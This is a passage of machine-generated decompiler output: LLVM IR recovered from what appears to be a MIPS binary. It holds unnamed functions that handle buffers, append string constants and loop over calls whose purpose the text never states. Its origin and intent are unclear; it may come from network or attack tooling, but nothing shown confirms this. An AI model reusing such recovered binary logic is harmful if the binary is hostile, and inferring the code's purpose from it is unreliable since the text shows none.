  %v3_402628 = load i32, i32* %v2_402628, align 4
  store i32 %v3_402628, i32* %a0.global-to-local, align 4
  %v2_40262c = ptrtoint i32* %stack_var_-152 to i32
  %v1_402630 = udiv i32 %v3_402628, 32
  %v1_402634 = mul nuw nsw i32 %v1_402630, 4
  %v2_402638 = add i32 %v1_402634, %v2_40262c
  store i32 %v2_402638, i32* %v1.global-to-local, align 4
  %v1_40263c = add i32 %v2_402638, 8
  %v2_40263c = inttoptr i32 %v1_40263c to i32*
  %v3_40263c = load i32, i32* %v2_40263c, align 4
  %v2_402644 = shl i32 1, %v3_402628
  store i32 %v2_402644, i32* %v0.global-to-local, align 4
  %v2_402648 = or i32 %v3_40263c, %v2_402644
  %v3_40264c = load i32, i32* @global_var_449bf0.121, align 4
  store i32 %v3_40264c, i32* @t9, align 4
  store i32 %v2_402648, i32* %v2_40263c, align 4
  %v0_402654 = load i32, i32* %a0.global-to-local, align 4
  %v1_402654 = add i32 %v0_402654, 1
  store i32 %v1_402654, i32* %a0.global-to-local, align 4
  %v6_402664 = call i32 @function_405110(i32 %v1_402654, i32 %v2_402600, i32 0)
  store i32 %v6_402664, i32* %v0.global-to-local, align 4
  %v1_402670 = icmp slt i32 %v6_402664, 1
  br i1 %v1_402670, label %dec_label_pc_4026d8, label %dec_label_pc_402674

dec_label_pc_402674:                              ; preds = %dec_label_pc_402624
  %v3_402678 = load i32, i32* @global_var_449c64.110, align 4
  store i32 %v3_402678, i32* @t9, align 4
  %v0_40267c = load i32, i32* %s1.global-to-local, align 4
  %v1_40267c = add i32 %v0_40267c, 8
  %v2_40267c = inttoptr i32 %v1_40267c to i32*
  %v3_40267c = load i32, i32* %v2_40267c, align 4
  store i32 %v3_40267c, i32* %a0.global-to-local, align 4
  %v0_402680 = load i32, i32* @s0, align 4
  %v6_402684 = inttoptr i32 %v0_402680 to i32*
  %v7_402684 = call i32 @function_405d90(i32 %v3_40267c, i32* %v6_402684, i32 1024, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_402684, i32* @v0, align 4
  %v1_402690 = icmp slt i32 %v7_402684, 1
  store i32 0, i32* @v1, align 4
  br i1 %v1_402690, label %dec_label_pc_4026dc, label %dec_label_pc_402694

dec_label_pc_402694:                              ; preds = %dec_label_pc_402674
  %v1_4026a0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_4026a0, i32* %a0.global-to-local, align 4
  %v2_4026a0 = call i32 @function_403e84()
  store i32 %v2_4026a0, i32* %v0.global-to-local, align 4
  %v0_4026ac = load i32, i32* @s0, align 4
  store i32 %v0_4026ac, i32* %a0.global-to-local, align 4
  %v5_4026bc = call i32 @function_404164(i32 %v0_4026ac, i32 1024, i32 %v1_4026a0, i32 %v2_4026a0)
  store i32 %v5_4026bc, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_4026d0 = icmp eq i32 %v5_4026bc, -1
  br i1 %v2_4026d0, label %dec_label_pc_4026d8, label %dec_label_pc_4026dc

dec_label_pc_4026d8:                              ; preds = %dec_label_pc_402694, %dec_label_pc_402624
  store i32 0, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4026dc

dec_label_pc_4026dc:                              ; preds = %dec_label_pc_402694, %dec_label_pc_402674, %dec_label_pc_4026d8
  %v0_4026ec = phi i32 [ %v5_4026bc, %dec_label_pc_402694 ], [ 0, %dec_label_pc_402674 ], [ 0, %dec_label_pc_4026d8 ]
  store i32 %v0_4026ec, i32* %v0.global-to-local, align 4
  ret i32 %v0_4026ec

; uselistorder directives
  uselistorder i32 %v0_4026ec, { 1, 0 }
  uselistorder i32 %v3_402628, { 1, 0, 2 }
  uselistorder i32 %v1_40261c, { 1, 2, 0 }
  uselistorder i32 %v2_402600, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4026dc, { 2, 0, 1 }
}

define i32 @function_4026f8(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_4026f8:
  %s1.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  %v3_402718 = load i32, i32* @global_var_449b18.115, align 4
  store i32 %v3_402718, i32* @t9, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  %v5_402724 = call i32 @function_4051f0(i32* null)
  %v0_402730 = load i32, i32* @s0, align 4
  %v1_402730 = trunc i32 %v0_402730 to i8
  %v3_402730 = add i32 %arg1, 16
  %v4_402730 = inttoptr i32 %v3_402730 to i8*
  store i8 %v1_402730, i8* %v4_402730, align 1
  %v1_402734 = load i32, i32* %s1.global-to-local, align 4
  %v2_402734 = add i32 %v1_402734, 12
  %v3_402734 = inttoptr i32 %v2_402734 to i32*
  store i32 %v5_402724, i32* %v3_402734, align 4
  ret i32 %v5_402724
}

define i32 @function_40274c(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_40274c:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  %v0_40275c = load i32, i32* @ra, align 4
  %v0_402760 = load i32, i32* @s1, align 4
  %v0_402764 = load i32, i32* @s0, align 4
  %v3_40276c = load i32, i32* @global_var_449b18.115, align 4
  store i32 %v3_40276c, i32* @t9, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  %v5_402778 = call i32 @function_4051f0(i32* null)
  store i32 %v5_402778, i32* %v0.global-to-local, align 4
  %v1_402784 = add i32 %arg1, 8
  %v2_402784 = inttoptr i32 %v1_402784 to i32*
  %v3_402784 = load i32, i32* %v2_402784, align 4
  %v3_402788 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_402788, i32* @t9, align 4
  %v3_402790 = add i32 %arg1, 12
  %v4_402790 = inttoptr i32 %v3_402790 to i32*
  store i32 %v5_402778, i32* %v4_402790, align 4
  %v6_402790 = call i32 @function_404d20(i32 %v3_402784)
  store i32 %v6_402790, i32* %v0.global-to-local, align 4
  %v0_40279c = load i32, i32* @s0, align 4
  %v1_40279c = trunc i32 %v0_40279c to i8
  %v2_40279c = load i32, i32* %s1.global-to-local, align 4
  %v3_40279c = add i32 %v2_40279c, 17
  %v4_40279c = inttoptr i32 %v3_40279c to i8*
  store i8 %v1_40279c, i8* %v4_40279c, align 1
  %v0_4027a0 = load i32, i32* @s0, align 4
  %v1_4027a0 = icmp eq i32 %v0_4027a0, 0
  %v2_4027a0 = load i32, i32* %s1.global-to-local, align 4
  %v3_4027a0 = add i32 %v2_4027a0, 16
  %v4_4027a0 = inttoptr i32 %v3_4027a0 to i8*
  store i8 0, i8* %v4_4027a0, align 1
  br i1 %v1_4027a0, label %dec_label_pc_40274c.dec_label_pc_4027cc_crit_edge, label %dec_label_pc_4027a4

dec_label_pc_40274c.dec_label_pc_4027cc_crit_edge: ; preds = %dec_label_pc_40274c
  %v4_4027d8.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4027cc

dec_label_pc_4027a4:                              ; preds = %dec_label_pc_40274c
  %v0_4027a8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4027a8 = add i32 %v0_4027a8, 1044
  %v2_4027a8 = inttoptr i32 %v1_4027a8 to i32*
  %v3_4027a8 = load i32, i32* %v2_4027a8, align 4
  store i32 %v3_4027a8, i32* %v0.global-to-local, align 4
  %v3_4027ac = load i32, i32* @global_var_449a64.128, align 4
  store i32 %v3_4027ac, i32* @t9, align 4
  %v1_4027b0 = icmp eq i32 %v3_4027a8, 0
  br i1 %v1_4027b0, label %dec_label_pc_4027cc, label %dec_label_pc_4027b4

dec_label_pc_4027b4:                              ; preds = %dec_label_pc_4027a4
  store i32 %v0_40275c, i32* @ra, align 4
  store i32 %v0_402760, i32* @s1, align 4
  store i32 %v0_402764, i32* @s0, align 4
  %v5_4027c4 = call i32 @function_4063f0(i32 %v3_4027a8)
  store i32 %v5_4027c4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4027cc

dec_label_pc_4027cc:                              ; preds = %dec_label_pc_40274c.dec_label_pc_4027cc_crit_edge, %dec_label_pc_4027a4, %dec_label_pc_4027b4
  %v4_4027d8 = phi i32 [ %v4_4027d8.pre, %dec_label_pc_40274c.dec_label_pc_4027cc_crit_edge ], [ 0, %dec_label_pc_4027a4 ], [ %v5_4027c4, %dec_label_pc_4027b4 ]
  store i32 %v0_402760, i32* %s1.global-to-local, align 4
  ret i32 %v4_4027d8

; uselistorder directives
  uselistorder i32 %v0_402760, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4027cc, { 2, 1, 0 }
}

define i32 @function_4027e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4027e0:
  %v3_402800 = load i32, i32* @global_var_449b18.115, align 4
  store i32 %v3_402800, i32* @t9, align 4
  %v2_40280c = urem i32 %arg2, 65536
  store i32 %v2_40280c, i32* @s0, align 4
  %v5_40280c = call i32 @function_4051f0(i32* null)
  %v1_402814 = add i32 %arg1, 12
  %v2_402814 = inttoptr i32 %v1_402814 to i32*
  %v3_402814 = load i32, i32* %v2_402814, align 4
  %v0_40281c = load i32, i32* @s0, align 4
  %v2_40281c = add i32 %v0_40281c, %v3_402814
  %v2_402820 = icmp slt i32 %v2_40281c, %v5_40280c
  %v1_402828 = icmp eq i1 %v2_402820, false
  br i1 %v1_402828, label %dec_label_pc_4027e0.dec_label_pc_40284c_crit_edge, label %dec_label_pc_40282c

dec_label_pc_4027e0.dec_label_pc_40284c_crit_edge: ; preds = %dec_label_pc_4027e0
  br label %dec_label_pc_40284c

dec_label_pc_40282c:                              ; preds = %dec_label_pc_4027e0
  %v3_402830 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_402840 = add i32 %v3_402830, 10060
  call void @__pseudo_branch(i32 %v1_402840)
  br label %dec_label_pc_40284c

dec_label_pc_40284c:                              ; preds = %dec_label_pc_4027e0.dec_label_pc_40284c_crit_edge, %dec_label_pc_40282c
  ret i32 %v5_40280c

; uselistorder directives
  uselistorder i32 %v5_40280c, { 1, 0 }
  uselistorder label %dec_label_pc_40284c, { 1, 0 }
}

define i32 @function_402860(i32 %arg1) local_unnamed_addr {
dec_label_pc_402860:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp75 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = call i32 @__decompiler_undefined_function_0()
  %tmp77 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2319 = alloca i32, align 4
  %stack_var_-2320 = alloca i8, align 1
  %stack_var_-2332 = alloca i32, align 4
  %stack_var_-2328 = alloca i32, align 4
  %stack_var_-2336 = alloca i32, align 4
  %stack_var_-2244 = alloca i32, align 4
  %stack_var_-2312 = alloca i32, align 4
  %stack_var_-2276 = alloca i32, align 4
  %stack_var_-2116 = alloca i32, align 4
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-2296 = alloca i32, align 4
  %v1_402868 = load i32, i32* @t9, align 4
  %v2_402868 = add i32 %v1_402868, 323920
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402890 = load i32, i32* @s1, align 4
  %v0_402894 = load i32, i32* @s0, align 4
  %v3_40289c = load i32, i32* @global_var_449b50.97, align 4
  store i32 %v3_40289c, i32* @t9, align 4
  %v2_4028a4 = urem i32 %arg1, 256
  store i32 %v2_4028a4, i32* @s6, align 4
  %v3_4028a4 = call i32 @function_404d80()
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v3_4028a4, i32* %v1.global-to-local, align 4
  %v3_4028b4 = load i32, i32* bitcast (i32** @global_var_449b2c.125 to i32*), align 4
  store i32 %v3_4028b4, i32* %v0.global-to-local, align 4
  %v1_4028b8 = icmp sgt i32 %v3_4028a4, 0
  %v4_4028b8 = inttoptr i32 %v3_4028b4 to i32*
  store i32 %v3_4028a4, i32* %v4_4028b8, align 4
  br i1 %v1_4028b8, label %dec_label_pc_402860.dec_label_pc_403c18_crit_edge, label %dec_label_pc_4028bc

dec_label_pc_402860.dec_label_pc_403c18_crit_edge: ; preds = %dec_label_pc_402860
  %v4_403c40.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403c18

dec_label_pc_4028bc:                              ; preds = %dec_label_pc_402860
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_4028c4 = load i32, i32* %v1.global-to-local, align 4
  %v2_4028c4 = icmp eq i32 %v0_4028c4, -1
  br i1 %v2_4028c4, label %dec_label_pc_403c18, label %dec_label_pc_4028c8

dec_label_pc_4028c8:                              ; preds = %dec_label_pc_4028bc
  %v3_4028cc = load i32, i32* @global_var_449b78.96, align 4
  store i32 %v3_4028cc, i32* @t9, align 4
  %v1_4028d4 = call i32 @function_401e44()
  store i32 %v1_4028d4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4028e4 = load i32, i32* @global_var_449c68.129, align 4
  store i32 %v3_4028e4, i32* @t9, align 4
  %v1_4028ec = call i32 @function_404de0()
  store i32 %v1_4028ec, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 84, i32* %a0.global-to-local, align 4
  %v3_4028fc = load i32, i32* @global_var_449c74.130, align 4
  store i32 %v3_4028fc, i32* @t9, align 4
  store i32 %v1_4028ec, i32* @s1, align 4
  %v3_402904 = call i32 @function_406b30(i32 84)
  store i32 %v3_402904, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 0, i32* %stack_var_-2336, align 4
  %v3_402914 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_402914, i32* @t9, align 4
  store i32 %v3_402904, i32* @s0, align 4
  %v3_40291c = call i32 @function_401d34()
  store i32 %v3_40291c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402928 = load i32, i32* @s0, align 4
  %v1_402928 = icmp slt i32 %v0_402928, 1
  store i32 %v3_40291c, i32* @s2, align 4
  br i1 %v1_402928, label %dec_label_pc_4031e8, label %dec_label_pc_40292c

dec_label_pc_40292c:                              ; preds = %dec_label_pc_4028c8
  %v2_402934 = icmp eq i32 %v0_402928, 1
  %. = select i1 %v2_402934, i32 500, i32 1000
  store i32 %., i32* %v1.global-to-local, align 4
  %v0_402940 = load i32, i32* @s1, align 4
  %v1_402940 = add i32 %v0_402940, 65436
  %v1_402944 = urem i32 %v1_402940, 65536
  store i32 %v1_402944, i32* @s7, align 4
  %v2_402948 = icmp ult i32 %., %v1_402944
  %v3_402948 = zext i1 %v2_402948 to i32
  store i32 %v3_402948, i32* @v0, align 4
  %v1_40294c = icmp eq i1 %v2_402948, false
  br i1 %v1_40294c, label %dec_label_pc_402958, label %dec_label_pc_402950

dec_label_pc_402950:                              ; preds = %dec_label_pc_40292c
  store i32 %., i32* @s7, align 4
  br label %dec_label_pc_402958

dec_label_pc_402958:                              ; preds = %dec_label_pc_40292c, %dec_label_pc_402950
  %v0_40295c = phi i32 [ %v1_402944, %dec_label_pc_40292c ], [ %., %dec_label_pc_402950 ]
  %v3_402958 = load i32, i32* @global_var_449bac.120, align 4
  store i32 %v3_402958, i32* @t9, align 4
  store i32 %v0_40295c, i32* %a0.global-to-local, align 4
  %v3_40296061 = zext i32 %v0_40295c to i64
  %v4_402960 = call i32 @function_406330(i64 %v3_40296061, i32 1048)
  store i32 %v4_402960, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402970 = load i32, i32* @global_var_449bac.120, align 4
  store i32 %v3_402970, i32* @t9, align 4
  store i32 0, i32* %stack_var_-2332, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v4_40297c = call i32 @function_406330(i64 1, i32 2054)
  store i32 %v4_40297c, i32* @s1, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402990 = load i32, i32* @s6, align 4
  %v2_402990 = icmp eq i32 %v0_402990, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_402990, label %dec_label_pc_402d84, label %dec_label_pc_402994

dec_label_pc_402994:                              ; preds = %dec_label_pc_402958
  %v2_402998 = icmp eq i32 %v0_402990, 3
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_402998, label %dec_label_pc_40299c, label %dec_label_pc_402cd8

dec_label_pc_40299c:                              ; preds = %dec_label_pc_402994
  %v0_4029a8 = load i32, i32* @s2, align 4
  %v2_4029a8 = zext i32 %v0_4029a8 to i64
  %v4_4029a8 = mul nuw i64 %v2_4029a8, 3435973837
  %v3_4029ac = load i32, i32* @global_var_449c18.131, align 4
  store i32 %v3_4029ac, i32* @t9, align 4
  %v2_4029b0 = ptrtoint i32* %stack_var_-2296 to i32
  store i32 %v2_4029b0, i32* %a0.global-to-local, align 4
  %v1_4029b82 = udiv i64 %v4_4029a8, 17179869184
  %v1_4029b8 = trunc i64 %v1_4029b82 to i32
  store i32 %v1_4029b8, i32* %v0.global-to-local, align 4
  %v1_4029bc4 = mul nuw nsw i64 %v1_4029b82, 4
  %v1_4029bc = trunc i64 %v1_4029bc4 to i32
  %v2_4029c0.neg = add i32 %v0_4029a8, 5
  %v2_4029c4 = sub i32 %v2_4029c0.neg, %v1_4029b8
  %v1_4029c8 = sub i32 %v2_4029c4, %v1_4029bc
  store i32 %v1_4029c8, i32* @s0, align 4
  %v4_4029cc = bitcast i32* %stack_var_-2296 to i8*
  %v5_4029cc = call i32 @function_401d90(i8* %v4_4029cc, i32 %v1_4029c8)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4029d8 = load i32, i32* @sp, align 4
  %v1_4029d8 = load i32, i32* @s0, align 4
  %v2_4029d8 = add i32 %v1_4029d8, %v0_4029d8
  store i32 %v2_4029d8, i32* %v0.global-to-local, align 4
  %v3_4029dc = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_4029dc, i32* @t9, align 4
  %v1_4029e0 = add i32 %v2_4029d8, 80
  %v2_4029e0 = inttoptr i32 %v1_4029e0 to i8*
  store i8 0, i8* %v2_4029e0, align 1
  store i32 28, i32* %a0.global-to-local, align 4
  %v2_4029e4 = call i32 @function_4002d0(i32 28)
  store i32 %v2_4029e4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4029f4 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_4029f4, i32* @t9, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v2_4029fc = call i32 @function_4002d0(i32 27)
  store i32 %v2_4029fc, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402a0c = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_402a0c, i32* @t9, align 4
  store i32 29, i32* %a0.global-to-local, align 4
  %v2_402a14 = call i32 @function_4002d0(i32 29)
  store i32 %v2_402a14, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402a24 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_402a24, i32* @t9, align 4
  store i32 30, i32* %a0.global-to-local, align 4
  %v2_402a2c = call i32 @function_4002d0(i32 30)
  store i32 %v2_402a2c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402a3c = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_402a3c, i32* @t9, align 4
  store i32 30, i32* %a0.global-to-local, align 4
  %v2_402a44 = call i32 @function_400564(i32 30)
  store i32 %v2_402a44, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 28, i32* %a0.global-to-local, align 4
  %v3_402a54 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_402a54, i32* @t9, align 4
  %v6_402a5c = call i32 @function_400564(i32 28)
  store i32 %v6_402a5c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v3_402a6c = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_402a6c, i32* @t9, align 4
  store i32 %v6_402a5c, i32* @s2, align 4
  %v3_402a74 = call i32 @function_400564(i32 27)
  store i32 %v3_402a74, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 29, i32* %a0.global-to-local, align 4
  %v3_402a84 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_402a84, i32* @t9, align 4
  store i32 %v3_402a74, i32* @s0, align 4
  %v3_402a8c = call i32 @function_400564(i32 29)
  store i32 %v3_402a8c, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402a9c = load i32, i32* @global_var_449c70.132, align 4
  store i32 %v3_402a9c, i32* @t9, align 4
  %v1_402aa4 = load i32, i32* @s0, align 4
  store i32 %v1_402aa4, i32* %a0.global-to-local, align 4
  %v3_402aa4 = call i32 @function_401ef4(i32 %v1_402aa4)
  store i32 %v3_402aa4, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_402ab0 = icmp eq i32 %v3_402aa4, 0
  %v3_402ab0 = load i32, i32* @s1, align 4
  %v4_402ab0 = inttoptr i32 %v3_402ab0 to i32*
  store i32 %v3_402aa4, i32* %v4_402ab0, align 4
  br i1 %v1_402ab0, label %dec_label_pc_402bd4, label %dec_label_pc_402ab4

dec_label_pc_402ab4:                              ; preds = %dec_label_pc_40299c
  %v3_402ab8 = load i32, i32* @global_var_449c70.132, align 4
  store i32 %v3_402ab8, i32* @t9, align 4
  %v1_402ac0 = load i32, i32* @s2, align 4
  store i32 %v1_402ac0, i32* %a0.global-to-local, align 4
  %v3_402ac0 = call i32 @function_401ef4(i32 %v1_402ac0)
  store i32 %v3_402ac0, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_402acc = icmp eq i32 %v3_402ac0, 0
  %v3_402acc = load i32, i32* @s1, align 4
  %v4_402acc = add i32 %v3_402acc, 4
  %v5_402acc = inttoptr i32 %v4_402acc to i32*
  store i32 %v3_402ac0, i32* %v5_402acc, align 4
  br i1 %v1_402acc, label %dec_label_pc_402bd4, label %dec_label_pc_402ad0

dec_label_pc_402ad0:                              ; preds = %dec_label_pc_402ab4
  %v0_402ad4 = load i32, i32* @s1, align 4
  %v1_402ad4 = inttoptr i32 %v0_402ad4 to i32*
  %v2_402ad4 = load i32, i32* %v1_402ad4, align 4
  store i32 %v2_402ad4, i32* @v0, align 4
  %v1_402adc = icmp eq i32 %v2_402ad4, 0
  br i1 %v1_402adc, label %dec_label_pc_402bd4, label %dec_label_pc_402ae0

dec_label_pc_402ae0:                              ; preds = %dec_label_pc_402ad0
  %v3_402ae8 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_402ae8, i32* @t9, align 4
  %v2_402aec = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  %v7_402af4 = bitcast i32* %stack_var_-1092 to i8*
  %v8_402af4 = call i32 @function_403f08(i8* %v7_402af4, i32 ptrtoint ([26 x i8]* @global_var_4085b0.133 to i32))
  store i32 %v8_402af4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402b00 = load i32, i32* @s1, align 4
  %v1_402b00 = add i32 %v0_402b00, 4
  %v2_402b00 = inttoptr i32 %v1_402b00 to i32*
  %v3_402b00 = load i32, i32* %v2_402b00, align 4
  store i32 %v3_402b00, i32* @a1, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  %v6_402b0c = call i32 @function_403ea8(i8* %v7_402af4, i32 %v3_402b00)
  store i32 %v6_402b0c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_4085cc.135 to i32), i32* @a1, align 4
  %v8_402b28 = call i32 @function_403ea8(i8* %v7_402af4, i32 ptrtoint ([8 x i8]* @global_var_4085cc.135 to i32))
  store i32 %v8_402b28, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402b34 = load i32, i32* @s1, align 4
  %v1_402b34 = inttoptr i32 %v0_402b34 to i32*
  %v2_402b34 = load i32, i32* %v1_402b34, align 4
  store i32 %v2_402b34, i32* @a1, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  %v6_402b40 = call i32 @function_403ea8(i8* %v7_402af4, i32 %v2_402b34)
  store i32 %v6_402b40, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4085c8.136 to i32), i32* @a1, align 4
  %v6_402b5c = call i32 @function_403ea8(i8* %v7_402af4, i32 ptrtoint (i32* @global_var_4085c8.136 to i32))
  store i32 %v6_402b5c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_4085d4.137 to i32), i32* @a1, align 4
  %v8_402b78 = call i32 @function_403ea8(i8* %v7_402af4, i32 ptrtoint ([27 x i8]* @global_var_4085d4.137 to i32))
  store i32 %v8_402b78, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_4029b0, i32* @a1, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  %v6_402b90 = call i32 @function_403ea8(i8* %v7_402af4, i32 %v2_4029b0)
  store i32 %v6_402b90, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_402aec, i32* %a0.global-to-local, align 4
  store i32 0, i32* @s2, align 4
  %v1_402ba8 = call i32 @function_403e84()
  store i32 %v1_402ba8, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v2_402bb4 = ptrtoint i32* %stack_var_-2116 to i32
  store i32 %v2_402bb4, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v1_402ba8, i32* @s3, align 4
  %v5_402bc4 = call i32 @function_403f6c(i32 %v2_402bb4, i32 0, i32 1024)
  store i32 %v5_402bc4, i32* @v0, align 4
  br label %dec_label_pc_402bd4

dec_label_pc_402bd4:                              ; preds = %dec_label_pc_402ad0, %dec_label_pc_402ab4, %dec_label_pc_40299c, %dec_label_pc_402ae0
  %v0_402bd4 = load i32, i32* %gp.global-to-local, align 4
  %v1_402bd4 = add i32 %v0_402bd4, -32588
  %v2_402bd4 = inttoptr i32 %v1_402bd4 to i32*
  %v3_402bd4 = load i32, i32* %v2_402bd4, align 4
  %v1_402bdc = load i32, i32* @s1, align 4
  store i32 %v1_402bdc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402bd4)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_402bec = load i32, i32* @global_var_449c00.77, align 4
  store i32 %v3_402bec, i32* @t9, align 4
  store i32 300, i32* %a0.global-to-local, align 4
  %v2_402bf4 = call i32 @function_4068f0(i32 300)
  store i32 %v2_402bf4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v2_402c08 = ptrtoint i32* %stack_var_-2276 to i32
  %v1_402c40 = ptrtoint i32* %stack_var_-2116 to i32
  %v5_402c4c = bitcast i32* %stack_var_-2116 to i8*
  %v2_402c60 = ptrtoint i32* %stack_var_-1092 to i32
  %v0_402c14.pre = load i32, i32* @t9, align 4
  br label %dec_label_pc_402c08

dec_label_pc_402c08:                              ; preds = %dec_label_pc_402c08, %dec_label_pc_402bd4
  %v0_402c14 = phi i32 [ %v3_402c5c, %dec_label_pc_402c08 ], [ %v0_402c14.pre, %dec_label_pc_402bd4 ]
  store i32 %v2_402c08, i32* @s0, align 4
  store i32 %v2_402c08, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402c14)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_402c20 = load i32, i32* @s1, align 4
  %v1_402c20 = load i32, i32* @s2, align 4
  %v2_402c20 = add i32 %v1_402c20, %v0_402c20
  store i32 %v2_402c20, i32* %v0.global-to-local, align 4
  %v3_402c28 = load i32, i32* @global_var_449adc.138, align 4
  store i32 %v3_402c28, i32* @t9, align 4
  %v1_402c2c = inttoptr i32 %v2_402c20 to i8*
  %v2_402c2c = load i8, i8* %v1_402c2c, align 1
  %v3_402c2c = sext i8 %v2_402c2c to i32
  store i32 %v2_402c08, i32* %a0.global-to-local, align 4
